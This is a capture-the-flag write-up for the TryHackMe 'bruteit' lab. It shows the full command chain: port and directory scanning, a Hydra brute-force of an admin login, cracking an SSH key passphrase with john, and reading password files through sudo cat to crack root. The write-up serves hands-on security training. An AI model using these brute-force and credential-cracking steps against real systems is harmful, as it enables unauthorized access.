# 5 - bruteit

Room Link --> [https://tryhackme.com/room/bruteit](https://tryhackme.com/room/bruteit)

Starting with an Nmap search:

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV -p- -Pn -n 10.10.43.114 --min-rate 20000

# results:
ports 22 and 80 are open.
```
{% endcode %}

Dirbusting with gobuster

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.43.114 -w /usr/share/wordlists/dirb/common.txt -t 300 2>/dev/null

# results:
Found a secret dir --> /admin
```
{% endcode %}

[http://10.10.43.114/admin/](http://10.10.43.114/admin/) --> this takes us to a login page, we viewed source code, and found the username is "admin".

Bruteforcing Login with Hydra.

From the developers option we craft our hydra payload.

<figure><img src=".gitbook/assets/Screenshot_20230901_085800.png" alt=""><figcaption><p>POST request to /admin/</p></figcaption></figure>

<figure><img src=".gitbook/assets/Screenshot_20230901_085820.png" alt=""><figcaption><p>POST data values</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>grep keyword</p></figcaption></figure>

Our payload will now be:

{% code overflow="wrap" lineNumbers="true" %}
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.43.114 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
```
{% endcode %}

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Login with credentials:

<figure><img src=".gitbook/assets/Screenshot_20230901_085256.png" alt=""><figcaption></figcaption></figure>

There's an SSH private key on the page, after downloading it, and trying to use it to login with "john" as username to SSH, it requested for a key.

<figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can use "ssh2john" to crack it.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we convert the private key to john crackable format.
ssh2john id_rsa > hash.txt

# crack with john.
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src=".gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can login to SSH now:

```
# give required permissions for the key
chmod 600 id_rsa

# login
ssh john@10.10.43.114 -i id_rsa
```

Login Success.

User flag is there.

### Privilege Escalation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo -l

# there is a "/bin/cat" binary, we go to gtfobins and check how to exploit it.
# we can cat the /etc/shadow content, and crack root password.
sudo /bin/cat /etc/passwd
# then crack it with john.
su root # input password and BOOM!
```
{% endcode %}
